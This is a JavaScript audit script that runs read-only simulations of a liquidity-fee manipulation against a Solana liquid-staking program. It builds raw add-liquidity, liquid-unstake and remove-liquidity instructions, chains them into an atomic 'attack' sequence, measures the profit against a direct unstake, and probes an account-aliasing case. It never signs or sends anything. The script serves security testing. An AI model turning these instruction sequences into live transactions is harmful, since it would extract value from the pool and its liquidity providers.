// Read-only v1 simulations for atomic liquidity-fee manipulation. Never signs or sends.
const fs = require('fs');
const crypto = require('crypto');
const {Connection, PublicKey, TransactionInstruction} = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/web3.js');
const spl = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/spl-token');
const {encodeV1} = require('../klend-v1-composition.js');
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split('\n').filter(Boolean).map(x => x.split(/=(.*)/s).slice(0, 2)));
const rpcUrl = env.HEAVY_RPC_URL || env.RPC_URL;
const conn = new Connection(rpcUrl, 'confirmed');
const P = x => new PublicKey(x);
const program = P('MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD');
const state = P('8szGkuLTAux9XMgZ2vtY39jVSowEcpBfFfD8hXSEqdGC');
const mint = P('mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So');
const lpMint = P('LPmSozJJ8Jh69ut2WP3XmVohTjL4ipR18yiCzxrUmVj');
const solLeg = P('UefNb6z6yvArqe4cJHTXCqStRsKmWhGxnZzuHbikP5Q');
const msolLeg = P('7GgPYjS5Dza89wV6FpZ23kUJRG5vbQ1GM25ezspYFSoE');
const treasury = P('B1aLzaNMeFVAyQ6f3XbbUyKcH2YPHu2fqiEagmiF23VR');
const user = P('6LY1JzAFVZsP2a2xKrtU6znQMQ5h4i7tocWdgrkZzkzF');
const userMsol = P('HBX3MgNtEwCxM3RXzqDxdM98m94DiHcqcYwB16HkbNhF');
const system = P('11111111111111111111111111111111');
const token = P('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const userLp = spl.getAssociatedTokenAddressSync(lpMint, user);
const [lpMintAuthority] = PublicKey.findProgramAddressSync(
  [state.toBuffer(), Buffer.from('liq_mint')], program);
const [msolLegAuthority] = PublicKey.findProgramAddressSync(
  [state.toBuffer(), Buffer.from('liq_st_sol_authority')], program);
const disc = name => crypto.createHash('sha256').update('global:' + name).digest().subarray(0, 8);
const u64 = n => {const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b;};
const meta = (pubkey, writable = false, signer = false) => ({pubkey, isWritable: writable, isSigner: signer});
const createLp = spl.createAssociatedTokenAccountIdempotentInstruction(user, userLp, user, lpMint);
function add(amount) {
  return new TransactionInstruction({programId: program, data: Buffer.concat([disc('add_liquidity'), u64(amount)]), keys: [
    meta(state, true), meta(lpMint, true), meta(lpMintAuthority), meta(msolLeg),
    meta(solLeg, true), meta(user, true, true), meta(userLp, true), meta(system), meta(token),
  ]});
}
function remove(amount) {
  return new TransactionInstruction({programId: program, data: Buffer.concat([disc('remove_liquidity'), u64(amount)]), keys: [
    meta(state, true), meta(lpMint, true), meta(userLp, true), meta(user, false, true),
    meta(user, true), meta(userMsol, true), meta(solLeg, true), meta(msolLeg, true),
    meta(msolLegAuthority), meta(system), meta(token),
  ]});
}
function liquid(amount) {
  return new TransactionInstruction({programId: program, data: Buffer.concat([disc('liquid_unstake'), u64(amount)]), keys: [
    meta(state, true), meta(mint, true), meta(solLeg, true), meta(msolLeg, true),
    meta(treasury, true), meta(userMsol, true), meta(user, false, true), meta(user, true),
    meta(system), meta(token),
  ]});
}
const watched = [user, userMsol, userLp, state, mint, lpMint, solLeg, msolLeg, treasury];
function project(a, i) {
  if (!a?.data) return null;
  const data = Buffer.from(a.data[0], 'base64');
  const out = {lamports: a.lamports, owner: a.owner, hash: crypto.createHash('sha256').update(data).digest('hex')};
  if ([1, 2, 7, 8].includes(i) && data.length >= 72) out.amount = data.readBigUInt64LE(64).toString();
  if ([4, 5].includes(i) && data.length >= 44) out.supply = data.readBigUInt64LE(36).toString();
  return out;
}
async function raw(method, params) {
  const response = await fetch(rpcUrl, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: method, method, params})});
  return response.json();
}
async function simulate(name, instructions, blockhash) {
  const encoded = encodeV1(instructions, user, blockhash);
  const json = await raw('simulateTransaction', [encoded.wire.toString('base64'), {encoding: 'base64',
    sigVerify: false, replaceRecentBlockhash: true, commitment: 'confirmed',
    accounts: {encoding: 'base64', addresses: watched.map(x => x.toBase58())}}]);
  const v = json.result?.value;
  return {name, err: v?.err || null, rpcError: json.error || null, slot: json.result?.context?.slot,
    messageBytes: encoded.sizeBytes, legacyV0Bytes: encoded.v0Bytes, accounts: encoded.addressCount,
    writable: encoded.writableCount, instructions: encoded.instructionCount,
    requiredSignatures: encoded.requiredSignatures, config: encoded.config,
    units: v?.unitsConsumed, loadedAccountsDataSize: v?.loadedAccountsDataSize,
    post: v?.accounts?.map(project), logs: v?.logs || []};
}
const amountAt = (result, i) => BigInt(result.post?.[i]?.amount || 0);
const lamportsAt = (result, i) => BigInt(result.post?.[i]?.lamports || 0);
const facts = result => result.logs.filter(x => /Instruction:|LP for user|SOL out amount|liq_pool SOL:|liquid unstake fee|Fee|failed|Error/.test(x));
async function main() {
  const preInfo = await conn.getMultipleAccountsInfoAndContext(watched, 'confirmed');
  const pre = preInfo.value.map((a, i) => a ? project({data: [a.data.toString('base64')], lamports: a.lamports,
    owner: a.owner.toBase58()}, i) : null);
  const preSol = BigInt(pre[0].lamports), preMsol = BigInt(pre[1].amount), preLp = BigInt(pre[2]?.amount || 0);
  const blockhash = (await conn.getLatestBlockhash('confirmed')).blockhash;
  const outputs = [];
  const specs = [
    [100000000000n, 100000000000n],
    [1000000000000n, 1000000000000n],
    [3000000000000n, 1000000000000n],
    [3000000000000n, 5000000000000n],
  ];
  for (const [added, sold] of specs) {
    const tag = `${added}_${sold}`;
    const addControl = await simulate(`add_control_${tag}`, [createLp, add(added)], blockhash);
    outputs.push(addControl);
    if (addControl.err || addControl.rpcError) continue;
    const mintedLp = amountAt(addControl, 2) - preLp;
    const attack = await simulate(`add_liquid_remove_${tag}`,
      [createLp, add(added), liquid(sold), remove(mintedLp)], blockhash);
    attack.input = {addedLamports: added.toString(), soldMsolRaw: sold.toString(), mintedLp: mintedLp.toString()};
    outputs.push(attack);
    if (attack.err || attack.rpcError) continue;
    const netMsolSpent = preMsol - amountAt(attack, 1);
    const netSolDelta = lamportsAt(attack, 0) - preSol;
    attack.normalized = {netMsolSpent: netMsolSpent.toString(), netSolDelta: netSolDelta.toString()};
    const direct = await simulate(`direct_normalized_${tag}`, [liquid(netMsolSpent)], blockhash);
    outputs.push(direct);
    if (!direct.err && !direct.rpcError) {
      const directSolDelta = lamportsAt(direct, 0) - preSol;
      direct.normalized = {netMsolSpent: netMsolSpent.toString(), netSolDelta: directSolDelta.toString(),
        attackAdvantageLamports: (netSolDelta - directSolDelta).toString()};
    }
  }
  outputs.push(await simulate('alias_lp_burn_from_to_msol_source',
    [createLp, add(100000000000n), liquid(100000000000n),
      new TransactionInstruction({programId: program, data: Buffer.concat([disc('remove_liquidity'), u64(1n)]), keys: [
        meta(state, true), meta(lpMint, true), meta(userMsol, true), meta(user, false, true),
        meta(user, true), meta(userMsol, true), meta(solLeg, true), meta(msolLeg, true),
        meta(msolLegAuthority), meta(system), meta(token),
      ]})], blockhash));
  for (const r of outputs) r.facts = facts(r);
  const output = {timestamp: new Date().toISOString(), program: program.toBase58(),
    liveSubmission: false, signatureVerification: false, transactionVersion: 1,
    payer: user.toBase58(), userMsol: userMsol.toBase58(), userLp: userLp.toBase58(),
    preSlot: preInfo.context.slot, watched: watched.map(x => x.toBase58()), pre, outputs};
  fs.writeFileSync('composer-runs/2026-10-15/marinade-gap-audit-91c47aca/marinade-v1-liquidity-fee.json',
    JSON.stringify(output, null, 2));
  for (const r of outputs) console.log(JSON.stringify({name: r.name, err: r.err, rpcError: r.rpcError,
    bytes: r.messageBytes, accounts: r.accounts, units: r.units, input: r.input,
    normalized: r.normalized, post: r.post?.slice(0, 8), facts: r.facts}));
}
main().catch(e => {console.error(e.stack); process.exitCode = 1;});
